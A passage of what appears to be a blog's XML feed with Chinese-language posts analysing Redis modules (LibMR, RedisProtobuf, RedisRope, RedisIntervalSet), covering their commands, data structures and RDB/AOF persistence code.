线程信息锁，变更 num_threads_alive/working 时会用到</span><br>    <span class="hljs-type">pthread_cond_t</span> threads_all_idle;  <span class="hljs-comment">// 线程空闲等待条件变量</span><br>    mr_jobqueue jobqueue;             <span class="hljs-comment">// 任务队列，所有线程共用一个任务队列</span><br>&#125; mr_thpool_;<br><br><span class="hljs-comment">// 线程池任务队列</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mr_jobqueue</span> &#123;</span><br>    <span class="hljs-type">pthread_mutex_t</span> rwmutex;  <span class="hljs-comment">// 从队列中新增/读取任务时的锁</span><br>    mr_job* front;            <span class="hljs-comment">// 队列最前方的指针</span><br>    mr_job* rear;             <span class="hljs-comment">// 队列最后方的指针</span><br>    mr_bsem* has_jobs;        <span class="hljs-comment">// 二进制信号量，用于标记队列中是否有任务</span><br>    <span class="hljs-type">int</span> len;                  <span class="hljs-comment">// 队列中任务数量</span><br>&#125; mr_jobqueue;<br><br><span class="hljs-comment">// 线程池中任务</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mr_job</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mr_job</span>* <span class="hljs-title">prev</span>;</span>          <span class="hljs-comment">// 前一个任务指针</span><br>    <span class="hljs-type">void</span> (*function)(<span class="hljs-type">void</span>* arg);  <span class="hljs-comment">// 任务的函数指针</span><br>    <span class="hljs-type">void</span>* arg;                    <span class="hljs-comment">// 任务的函数指针中函数的参数</span><br>&#125; mr_job;<br><br><span class="hljs-comment">// 二进制信号量</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mr_bsem</span> &#123;</span><br>    <span class="hljs-type">pthread_mutex_t</span> mutex; <span class="hljs-comment">// 锁</span><br>    <span class="hljs-type">pthread_cond_t</span> cond;   <span class="hljs-comment">// 条件变量</span><br>    <span class="hljs-type">int</span> v;                 <span class="hljs-comment">// 该值为1代表队列中有任务，为0代表队列中无任务</span><br>&#125; mr_bsem;<br></code></pre></td></tr></table></figure><h4 id="2-2-4、消息发送数据结构"><a href="#2-2-4、消息发送数据结构" class="headerlink" title="2.2.4、消息发送数据结构"></a>2.2.4、消息发送数据结构</h4><p>线程池在处理任务时，需要将任务封装成一个 Message 的数据结构，然后发送该消息。</p><p><strong>消息发送的相关函数：</strong></p><ul><li>MR_ClusterSendMsgTask : 根据任务类型给对应实例发送任务消息；</li><li>MR_ClusterSendMsgToNode : 给特定节点发送消息，如果节点连接状态异常则会将该消息临时存储与 <code>pendingMessages</code> 列表中；</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 发送消息结构体</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SendMsg</span> &#123;</span><br>    <span class="hljs-type">size_t</span> refCount;          <span class="hljs-comment">// 引用计数，非线程安全</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-type">char</span> idToSend[<span class="hljs-number">41</span>];    <span class="hljs-comment">// 目标实例的ID</span><br>        <span class="hljs-type">size_t</span> slotToSend;    <span class="hljs-comment">// 目标实例的SlotID</span><br>    &#125;;<br>    SendMsgType sendMsgType;  <span class="hljs-comment">// 发送消息的类型，目前有三种类型</span><br>    <span class="hljs-type">size_t</span> function;          <span class="hljs-comment">// 执行函数的ID</span><br>    <span class="hljs-type">char</span>* msg;                <span class="hljs-comment">// 消息内容</span><br>    <span class="hljs-type">size_t</span> msgLen;            <span class="hljs-comment">// 消息长度</span><br>&#125; SendMsg;<br><br><span class="hljs-comment">// 发送消息类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">SendMsgType</span> &#123;</span><br>    SendMsgType_BySlot,    <span class="hljs-comment">// 发送给对应SlotID的所在实例</span><br>    SendMsgType_ById,      <span class="hljs-comment">// 发送给目标实例</span><br>    SendMsgType_ToAll      <span class="hljs-comment">// 发送给所有实例</span><br>&#125; SendMsgType;<br></code></pre></td></tr></table></figure><h3 id="2-3、任务类型"><a href="#2-3、任务类型" class="headerlink" title="2.3、任务类型"></a>2.3、任务类型</h3><h2 id="三、持久化"><a href="#三、持久化" class="headerlink" title="三、持久化"></a>三、持久化</h2><p>无持久化的相关逻辑。</p><h2 id="四、实践"><a href="#四、实践" class="headerlink" title="四、实践"></a>四、实践</h2><h2 id="五、问题与思考"><a href="#五、问题与思考" class="headerlink" title="五、问题与思考"></a>五、问题与思考</h2>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
          <category> 相关库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> RedisLibrary </tag>
            
            <tag> LibMR </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RedisModule剖析 - RedisProtobuf</title>
      <link href="/2022/10/07/redismodule-redis-protobuf/"/>
      <url>/2022/10/07/redismodule-redis-protobuf/</url>
      
        <content type="html"><![CDATA[<p><code>RedisProtobuf</code> 是一款支持 <a href="https://zh.m.wikipedia.org/zh-hans/Protocol_Buffers">Protobuf</a> （目前仅支持Version 3） 的 Redis 模块，从而支持了较高级的嵌套数据结构，其设计灵感来自于 <a href="https://github.com/RedisJSON/RedisJSON">RedisJSON</a>。</p><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><ul><li>GitHub 地址：<a href="https://github.com/sewenew/redis-protobuf">https://github.com/sewenew/redis-protobuf</a></li></ul><h2 id="二、架构设计"><a href="#二、架构设计" class="headerlink" title="二、架构设计"></a>二、架构设计</h2><h3 id="2-1、依赖库"><a href="#2-1、依赖库" class="headerlink" title="2.1、依赖库"></a>2.1、依赖库</h3><ul><li><a href="https://github.com/protocolbuffers/protobuf">Protobuf</a> : 仅支持 version 3 ；</li></ul><h3 id="2-2、相关命令"><a href="#2-2、相关命令" class="headerlink" title="2.2、相关命令"></a>2.2、相关命令</h3><ul><li>pb.type : 获取指定 key 的消息类型；</li><li>pb.set : 设置指定 key 的消息类型的内容信息，支持新增与变更；</li><li>pb.get : 获取指定 key 的消息内容，支持 binary 和 json 的返回格式；</li><li>pb.clear : 清除指定 key 的消息内容，支持指定路径；</li><li>pb.len : 获取指定 key 的消息长度，支持指定路径；</li><li>pb.append : 给指定 key 的特定路径中追加数据，目标路径的类型可以为 string&#x2F;array ;</li><li>pb.del : 删除指定 key ，或者删除指定 key 中 array&#x2F;map 中的 value信息；</li><li>pb.schema : 获取指定消息类型的纲要；</li><li>pb.merge : 将指定的 value 合并到指定 key 中，支持指定路径（依据于 protobuf 的 mergefrom ）；</li><li>pb.import : 异步导入一个 protobuf 文件，需要使用 pb.lastimport 来检查是否导入成功；</li><li>pb.lastimport : 检查之前一次或多次调用 pb.import 导入文件的结果，无法重试，第二次执行将会返回空；</li></ul><h3 id="2-3、数据结构"><a href="#2-3、数据结构" class="headerlink" title="2.3、数据结构"></a>2.3、数据结构</h3><ul><li>Value 类型 ： <code>google::protobuf::Message</code> ；</li></ul><h3 id="2-4、持久化"><a href="#2-4、持久化" class="headerlink" title="2.4、持久化"></a>2.4、持久化</h3><h4 id="2-4-1、RDB的持久化"><a href="#2-4-1、RDB的持久化" class="headerlink" title="2.4.1、RDB的持久化"></a>2.4.1、RDB的持久化</h4><p>RDB 的存储过程比较简单，直接把 Rust 的数据结构转换为 string 持久化到 RDB 文件中。</p><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-type">void</span> RedisProtobuf::_rdb_save(RedisModuleIO *rdb, <span class="hljs-type">void</span> *value) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-built_in">assert</span>(rdb != <span class="hljs-literal">nullptr</span>);<br><br>        std::string type;<br>        std::string buf;<br>        std::<span class="hljs-built_in">tie</span>(type, buf) = <span class="hljs-built_in">serialize_message</span>(value);<br><br>        <span class="hljs-built_in">RedisModule_SaveStringBuffer</span>(rdb, type.<span class="hljs-built_in">data</span>(), type.<span class="hljs-built_in">size</span>());<br><br>        <span class="hljs-built_in">RedisModule_SaveStringBuffer</span>(rdb, buf.<span class="hljs-built_in">data</span>(), buf.<span class="hljs-built_in">size</span>());<br>    &#125; <span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> Error &amp;e) &#123;<br>        <span class="hljs-built_in">RedisModule_LogIOError</span>(rdb, <span class="hljs-string">&quot;warning&quot;</span>, e.<span class="hljs-built_in">what</span>());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-4-2、AOF的持久化"><a href="#2-4-2、AOF的持久化" class="headerlink" title="2.4.2、AOF的持久化"></a>2.4.2、AOF的持久化</h4><p>AOF 的存储过程是将原始的数据的通过 <code>pb.set</code> 命令进行存储，从而实现了 AOF 的持久化。</p><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-type">void</span> RedisProtobuf::_aof_rewrite(RedisModuleIO *aof, RedisModuleString *key, <span class="hljs-type">void</span> *value) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-built_in">assert</span>(aof != <span class="hljs-literal">nullptr</span>);<br><br>        <span class="hljs-keyword">if</span> (key == <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;null key to rewrite aof&quot;</span>);<br>        &#125;<br><br>        std::string type;<br>        std::string buf;<br>        std::<span class="hljs-built_in">tie</span>(type, buf) = <span class="hljs-built_in">serialize_message</span>(value);<br><br>        <span class="hljs-built_in">RedisModule_EmitAOF</span>(aof,<br>                <span class="hljs-string">&quot;PB.SET&quot;</span>,<br>                <span class="hljs-string">&quot;sbb&quot;</span>,<br>                key,<br>                type.<span class="hljs-built_in">data</span>(),<br>                type.<span class="hljs-built_in">size</span>(),<br>                buf.<span class="hljs-built_in">data</span>(),<br>                buf.<span class="hljs-built_in">size</span>());<br>    &#125; <span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> Error &amp;e) &#123;<br>        <span class="hljs-built_in">RedisModule_LogIOError</span>(aof, <span class="hljs-string">&quot;warning&quot;</span>, e.<span class="hljs-built_in">what</span>());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="三、思考"><a href="#三、思考" class="headerlink" title="三、思考"></a>三、思考</h3><ul><li>相比于 RedisJson 的性能，该模块的性能如何？</li></ul>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
          <category> RedisModule </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> RedisModule </tag>
            
            <tag> RedisProtobuf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RedisModule剖析 - RedisRope</title>
      <link href="/2022/10/04/redismodule-redis-rope/"/>
      <url>/2022/10/04/redismodule-redis-rope/</url>
      
        <content type="html"><![CDATA[<p><code>RedisRope</code> 是一款可用于操作大型字符串数据（插入&#x2F;拼接等变动）的 Redis 模块。它通过将一个独立的字符串拆分成多个Chunk中进行存储，从而实现了针对于大型字符串的多样写操作（插入&#x2F;拼接等）的高效率，并通过引入 <a href="https://en.wikipedia.org/wiki/Splay_tree">伸展树（Splay Tree）</a> 的数据结构来保证数据读取的高效性。</p><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><ul><li>GitHub 地址：<a href="https://github.com/ekzhang/redis-rope">https://github.com/ekzhang/redis-rope</a></li></ul><h2 id="二、架构设计"><a href="#二、架构设计" class="headerlink" title="二、架构设计"></a>二、架构设计</h2><h3 id="2-1、相关命令"><a href="#2-1、相关命令" class="headerlink" title="2.1、相关命令"></a>2.1、相关命令</h3><ul><li>rope.len : 获取特定 key 的长度；</li><li>rope.get : 获取特定 key 指定索引处的字符；</li><li>rope.getrange : 获取特定 key 指定范围内的字符串；</li><li>rope.append : 给特定 key 追加字符串；</li><li>rope.insert : 在特定 key 的指定索引处插入字符串；</li><li>rope.delrange : 删除特定 key 指定范围内的字符串；</li><li>rope.splice : 从源字符串中选出部分字符串并将其拼接到目标字符串中（高级操作）；</li></ul><h3 id="2-2、数据结构"><a href="#2-2、数据结构" class="headerlink" title="2.2、数据结构"></a>2.2、数据结构</h3><figure class="highlight rust"><table><tr><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// 自定义的 Module 数据类型</span><br><span class="hljs-keyword">pub</span> var rope_tm: rm.RedisModuleTypeMethods = .&#123;<br>    .version = rm.REDISMODULE_TYPE_METHOD_VERSION,<br>    .rdb_load = ropeRdbLoad,<br>    .rdb_save = ropeRdbSave,<br>    .aof_rewrite = ropeAofRewrite,<br>    .free = ropeFree,<br><br>    <span class="hljs-comment">// Optional fields</span><br>    .digest = ropeDigest,<br>    .mem_usage = ropeMemUsage,<br>    .free_effort = ropeFreeEffort,<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">const</span> min_bytes = <span class="hljs-number">64</span>;<br><span class="hljs-keyword">const</span> cap_bytes = <span class="hljs-number">127</span>;<br><br><span class="hljs-comment">// 自定义的数据结构的结构体</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> Rope = <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> rope_size = @<span class="hljs-title function_ invoke__">sizeOf</span>(Rope);<br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> node_size = @<span class="hljs-title function_ invoke__">sizeOf</span>(Node);<br><br>    allocator: Allocator,<br>    root: ?*Node = null,<br>    suf_len: <span class="hljs-type">u8</span> = <span class="hljs-number">0</span>,<br>    suf_buf: [min_bytes - <span class="hljs-number">1</span>]<span class="hljs-type">u8</span> = undefined,<br><br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">destroy</span>(<span class="hljs-keyword">self</span>: *Rope) void &#123;&#125;               <span class="hljs-comment">// 销毁Rope并释放其占用的内存</span><br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">len</span>(<span class="hljs-keyword">self</span>: *<span class="hljs-keyword">const</span> Rope) <span class="hljs-type">u64</span> &#123;&#125;              <span class="hljs-comment">// 获取Rope的长度</span><br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">empty</span>(<span class="hljs-keyword">self</span>: *<span class="hljs-keyword">const</span> Rope) <span class="hljs-type">bool</span> &#123;&#125;           <span class="hljs-comment">// 判断Rope是否为空</span><br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">merge</span>(<span class="hljs-keyword">self</span>: *Rope, other: *Rope) !void &#123;&#125;  <span class="hljs-comment">// 合并两个Rope</span><br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">split</span>(<span class="hljs-keyword">self</span>: *Rope, index: <span class="hljs-type">u64</span>) !*Rope &#123;&#125;   <span class="hljs-comment">// 从指定索引处拆分Rope</span><br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">get</span>(<span class="hljs-keyword">self</span>: *Rope, i: <span class="hljs-type">u64</span>) ?<span class="hljs-type">u8</span> &#123;&#125;            <span class="hljs-comment">// 获取指定索引处的一个比特</span><br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_scan</span>(<span class="hljs-keyword">self</span>: *Rope, i: <span class="hljs-type">u64</span>) ?[]<span class="hljs-type">u8</span> &#123;&#125;         <span class="hljs-comment">// 获取指定索引后的Rope中的所有字节</span><br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">memusage</span>(<span class="hljs-keyword">self</span>: *<span class="hljs-keyword">const</span> Rope) <span class="hljs-type">u64</span> &#123;&#125;         <span class="hljs-comment">// 获取该数据结构中的总内存大小</span><br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">numnodes</span>(<span class="hljs-keyword">self</span>: *<span class="hljs-keyword">const</span> Rope) <span class="hljs-type">u64</span> &#123;&#125;         <span class="hljs-comment">// 获取该数据结构中的展开树节点的数量</span><br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">create</span>(allocator: Allocator, bytes: []<span class="hljs-keyword">const</span> <span class="hljs-type">u8</span>) !*Rope &#123;&#125;   <span class="hljs-comment">// 创建一个新的Rope</span><br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">chunks</span>(<span class="hljs-keyword">self</span>: *Rope, start: <span class="hljs-type">u64</span>, end: <span class="hljs-type">u64</span>) Chunks &#123;&#125;         <span class="hljs-comment">// 返回范围内的有效Chunks</span><br>&#125;;<br><br><span class="hljs-keyword">const</span> Node = <span class="hljs-keyword">struct</span> &#123;<br>    parent: ?*Node = null,<br>    child: [<span class="hljs-number">2</span>]?*Node = .&#123; null, null &#125;,<br>    nodes: <span class="hljs-type">u64</span> = <span class="hljs-number">1</span>,<br>    size: <span class="hljs-type">u64</span> = <span class="hljs-number">0</span>,<br>    len: <span class="hljs-type">u8</span> = <span class="hljs-number">0</span>,<br>    data: [cap_bytes]<span class="hljs-type">u8</span> = undefined,<br><br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">dir</span>(<span class="hljs-keyword">self</span>: *<span class="hljs-keyword">const</span> Node) u1 &#123;&#125;                       <span class="hljs-comment">// 判断是否是根结点？</span><br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">update</span>(<span class="hljs-keyword">self</span>: *Node) void &#123;&#125;                        <span class="hljs-comment">// 更新节点信息</span><br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">connect</span>(pa: ?*Node, ch: ?*Node, x: u1) void &#123;&#125;     <span class="hljs-comment">// </span><br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">rot</span>(<span class="hljs-keyword">self</span>: *Node) void &#123;&#125;                           <span class="hljs-comment">// </span><br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">splay</span>(<span class="hljs-keyword">self</span>: *Node) void &#123;&#125;                         <span class="hljs-comment">// </span><br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">destroy</span>(<span class="hljs-keyword">self</span>: *Node, allocator: Allocator) void &#123;&#125; <span class="hljs-comment">// </span><br>&#125;;<br><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> Chunks = <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-keyword">const</span> block_size = <span class="hljs-number">65536</span>;<br><br>    rope: *Rope,<br>    start: <span class="hljs-type">u64</span>,<br>    end: <span class="hljs-type">u64</span>,<br>    buf: [block_size]<span class="hljs-type">u8</span> = undefined,<br><br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">remaining</span>(<span class="hljs-keyword">self</span>: *<span class="hljs-keyword">const</span> Chunks) <span class="hljs-type">u64</span> &#123;&#125;   <span class="hljs-comment">// 计算迭代器中还剩多少Chunk</span><br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">next</span>(<span class="hljs-keyword">self</span>: *Chunks) ?[]<span class="hljs-type">u8</span> &#123;&#125;            <span class="hljs-comment">// 返回此迭代器的下一个Chunk</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="2-3、持久化"><a href="#2-3、持久化" class="headerlink" title="2.3、持久化"></a>2.3、持久化</h3><h4 id="2-3-1、RDB的持久化"><a href="#2-3-1、RDB的持久化" class="headerlink" title="2.3.1、RDB的持久化"></a>2.3.1、RDB的持久化</h4><p>RDB 的存储过程比较简单，直接把自定义的数据结构依次存储到到 RDB 文件中。</p><figure class="highlight rust"><table><tr><td class="code"><pre><code class="hljs rust">export <span class="hljs-keyword">fn</span> <span class="hljs-title function_">ropeRdbSave</span>(io: *rm.RedisModuleIO, value: *anyopaque) void &#123;<br>    <span class="hljs-keyword">const</span> rope = @<span class="hljs-title function_ invoke__">ptrCast</span>(*Rope, @<span class="hljs-title function_ invoke__">alignCast</span>(@<span class="hljs-title function_ invoke__">alignOf</span>(*Rope), value));<br>    <span class="hljs-keyword">const</span> size = rope.<span class="hljs-title function_ invoke__">len</span>();<br>    rm.<span class="hljs-title function_ invoke__">RedisModule_SaveUnsigned</span>(io, size);<br>    var chunks = rope.<span class="hljs-title function_ invoke__">chunks</span>(<span class="hljs-number">0</span>, size);<br>    rm.<span class="hljs-title function_ invoke__">RedisModule_SaveUnsigned</span>(io, chunks.<span class="hljs-title function_ invoke__">remaining</span>());<br>    <span class="hljs-keyword">while</span> (chunks.<span class="hljs-title function_ invoke__">next</span>()) |buf| &#123;<br>        rm.<span class="hljs-title function_ invoke__">RedisModule_SaveStringBuffer</span>(io, buf.ptr, buf.len);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-3-2、AOF的持久化"><a href="#2-3-2、AOF的持久化" class="headerlink" title="2.3.2、AOF的持久化"></a>2.3.2、AOF的持久化</h4><p>AOF 的持久化的过程是把自定义数据类型的信息转换为操作的命令 <code>rope.append</code> 进行存储。</p><figure class="highlight rust"><table><tr><td class="code"><pre><code class="hljs rust">export <span class="hljs-keyword">fn</span> <span class="hljs-title function_">ropeAofRewrite</span>(io: *rm.RedisModuleIO, key: *rm.RedisModuleString, value: *anyopaque) void &#123;<br>    <span class="hljs-keyword">const</span> rope = @<span class="hljs-title function_ invoke__">ptrCast</span>(*Rope, @<span class="hljs-title function_ invoke__">alignCast</span>(@<span class="hljs-title function_ invoke__">alignOf</span>(*Rope), value));<br>    var chunks = rope.<span class="hljs-title function_ invoke__">chunks</span>(<span class="hljs-number">0</span>, rope.<span class="hljs-title function_ invoke__">len</span>());<br>    <span class="hljs-keyword">while</span> (chunks.<span class="hljs-title function_ invoke__">next</span>()) |buf| &#123;<br>        rm.<span class="hljs-title function_ invoke__">RedisModule_EmitAOF</span>(io, <span class="hljs-string">&quot;ROPE.APPEND&quot;</span>, <span class="hljs-string">&quot;sb&quot;</span>, key, buf.ptr, buf.len);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="三、问题与思考"><a href="#三、问题与思考" class="headerlink" title="三、问题与思考"></a>三、问题与思考</h2><h3 id="3-1、问题"><a href="#3-1、问题" class="headerlink" title="3.1、问题"></a>3.1、问题</h3><ul><li>关于伸展树的适用场景，以及在这里使用后对于读性能的影响有多大？</li></ul><h3 id="3-2、思考"><a href="#3-2、思考" class="headerlink" title="3.2、思考"></a>3.2、思考</h3><h2 id="四、相关链接"><a href="#四、相关链接" class="headerlink" title="四、相关链接"></a>四、相关链接</h2><ul><li><a href="https://www.cnblogs.com/vamei/archive/2013/03/24/2976545.html">纸上谈兵: 伸展树 (splay tree) </a></li><li><a href="https://zhuanlan.zhihu.com/p/348797577">深入理解伸展树(splay tree)</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
          <category> RedisModule </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> RedisModule </tag>
            
            <tag> RedisRope </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RedisModule剖析 - RedisIntervalSet</title>
      <link href="/2022/10/02/redismodule-redis-interval-sets/"/>
      <url>/2022/10/02/redismodule-redis-interval-sets/</url>
      
        <content type="html"><![CDATA[<p><code>RedisIntervalSet</code> 是一款用于记录不同间隔集合（IntervalSet）的 Redis 模块，按照官方文档给出的示例，我们可以记录从学前班、中学到大学的不同阶段的信息，每个阶段都有一个最小和最大值的分数（这里含义为年龄），最后可以通过查询不同的分数（年龄）来查询对应的学习阶段，通过这种方式能够快速的得到对应数据值所在的区间信息，这种设计思路有些类似于 <code>ZSet</code>。</p><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><ul><li>GitHub 地址：<a href="https://github.com/danitseitlin/redis-interval-sets">https://github.com/danitseitlin/redis-interval-sets</a></li></ul><h2 id="二、架构设计"><a href="#二、架构设计" class="headerlink" title="二、架构设计"></a>二、架构设计</h2><ul><li>该模块使用 <code>Rust</code> 进行编写，依赖于 <a href="https://github.com/RedisLabsModules/redismodule-rs/">redismodule-rs</a> 版本 <a href="https://github.com/RedisLabsModules/redismodule-rs/releases/tag/v0.26.0">0.26.0</a>;</li></ul><h3 id="2-1、相关命令"><a href="#2-1、相关命令" class="headerlink" title="2.1、相关命令"></a>2.1、相关命令</h3><ul><li>iset.add : 在特定的 key 中增加一个间隔集合（IntervalSet），必须带有最小及最大分数，可同时指定多个；</li><li>iset.del : 删除特定 key 或者删除其中的特定的间隔集合；</li><li>iset.get : 获取特定 key 中的所有间隔集合或者指定的间隔集合；</li><li>iset.score : 获取指定 key 中包含特定分数的集合列表；</li><li>iset.not_score : 获取指定 key 中不包含特定分数的集合列表；</li></ul><h3 id="2-2、数据结构"><a href="#2-2、数据结构" class="headerlink" title="2.2、数据结构"></a>2.2、数据结构</h3><figure class="highlight rust"><table><tr><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// 自定义的数据类型</span><br><span class="hljs-keyword">static</span> REDIS_INTERVAL_SETS: RedisType = RedisType::<span class="hljs-title function_ invoke__">new</span>(<br>    <span class="hljs-string">&quot;IntervlSt&quot;</span>,<br>    <span class="hljs-number">0</span>,<br>    raw::RedisModuleTypeMethods &#123;<br>        version: raw::REDISMODULE_TYPE_METHOD_VERSION <span class="hljs-keyword">as</span> <span class="hljs-type">u64</span>,<br>        rdb_load: <span class="hljs-title function_ invoke__">Some</span>(rdb_load),<br>        rdb_save: <span class="hljs-title function_ invoke__">Some</span>(rdb_save),<br>        aof_rewrite: <span class="hljs-literal">None</span>,<br>        free: <span class="hljs-title function_ invoke__">Some</span>(free),<br><br>        <span class="hljs-comment">// Currently unused by Redis</span><br>        mem_usage: <span class="hljs-literal">None</span>,<br>        digest: <span class="hljs-literal">None</span>,<br><br>        <span class="hljs-comment">// Aux data</span><br>        aux_load: <span class="hljs-literal">None</span>,<br>        aux_save: <span class="hljs-literal">None</span>,<br>        aux_save_triggers: <span class="hljs-number">0</span>,<br><br>        free_effort: <span class="hljs-literal">None</span>,<br>        unlink: <span class="hljs-literal">None</span>,<br>        copy: <span class="hljs-literal">None</span>,<br>        defrag: <span class="hljs-literal">None</span>,<br>    &#125;,<br>);<br><br><span class="hljs-comment">// 存储所有间隔集合的数据结构</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Sets</span>(<span class="hljs-keyword">pub</span> <span class="hljs-type">Vec</span>&lt;Set&gt;);<br><br><span class="hljs-comment">// 单个间隔集合的数据结构</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Set</span> &#123;<br>    <span class="hljs-keyword">pub</span> member: <span class="hljs-type">String</span>,     <span class="hljs-comment">// 间隔集合的名称</span><br>    <span class="hljs-keyword">pub</span> min_score: <span class="hljs-type">i64</span>,     <span class="hljs-comment">// 间隔集合的范围最小值</span><br>    <span class="hljs-keyword">pub</span> max_score: <span class="hljs-type">i64</span>,     <span class="hljs-comment">// 间隔集合的范围最大值</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-3、持久化"><a href="#2-3、持久化" class="headerlink" title="2.3、持久化"></a>2.3、持久化</h3><h4 id="2-3-1、RDB的持久化"><a href="#2-3-1、RDB的持久化" class="headerlink" title="2.3.1、RDB的持久化"></a>2.3.1、RDB的持久化</h4><p>RDB 的存储过程比较简单，直接把 Rust 的数据结构转换为 string 持久化到 RDB 文件中。</p><figure class="highlight rust"><table><tr><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">rdb_save</span>(rdb: *<span class="hljs-keyword">mut</span> raw::RedisModuleIO, value: *<span class="hljs-keyword">mut</span> c_void) &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">i_sets</span> =  &#123;&amp;*(value <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> IntervalSet) &#125;;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Saving: &#123;&#125;&quot;</span>, &amp;i_sets.<span class="hljs-title function_ invoke__">to_string</span>());<br>    raw::<span class="hljs-title function_ invoke__">save_string</span>(rdb, &amp;i_sets.<span class="hljs-title function_ invoke__">to_string</span>());<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-3-2、AOF的持久化"><a href="#2-3-2、AOF的持久化" class="headerlink" title="2.3.2、AOF的持久化"></a>2.3.2、AOF的持久化</h4><p>无 AOF 相关的持久化逻辑。 </p><h2 id="三、问题与思考"><a href="#三、问题与思考" class="headerlink" title="三、问题与思考"></a>三、问题与思考</h2><h3 id="3-1、问题"><a href="#3-1、问题" class="headerlink" title="3.1、问题"></a>3.1、问题</h3><ul><li>直接使用 <code>pub Vec&lt;Set&gt;</code> 来存储间隔集合，当存储的间隔集合较多时是否会出现性能问题，每次都需要遍历所有的集合，这里是否会有一些优化手段？简单的想法是通过跳表存储间隔集合的最小值，查询时首先查询跳表找到符合条件的初始值，避免前半部分无效的遍历；</li></ul><h3 id="3-2、思考"><a href="#3-2、思考" class="headerlink" 